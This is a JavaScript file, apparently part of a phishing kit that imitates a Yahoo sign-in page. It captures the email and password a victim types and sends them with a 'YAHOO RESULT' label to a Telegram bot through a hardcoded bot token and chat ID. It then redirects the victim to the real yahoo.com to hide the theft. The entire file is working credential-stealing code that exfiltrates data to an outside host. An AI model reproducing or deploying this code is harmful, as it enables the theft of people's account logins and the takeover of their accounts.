console.log("sender.js connected");

function sendTelegramMessageAndRedirect() {
  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
  const chatId = 5349229520; // Replace with your chat ID

  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const errorDisplay = document.querySelector(".error__wrapper");

  // Email validation regex for yahoo.com and yahoo.net domains
  const emailRegex = /^[^\s@]+@(yahoo\.com)$/;

  if (emailRegex.test(emailValue)) {
  }

  const messageText = `**YAHOO RESULT**\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
      window.location.href = "https://www.yahoo.com/"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}

const activeSubmit = document.querySelector(".password");

/* activeSubmit.addEventListener("input", function () {
  const button = document.querySelector(".btn--submit");

  button.style.backgroundColor = "#0084bd";
  button.style.color = "#ffffff";
  button.style.border = "none";
}); */
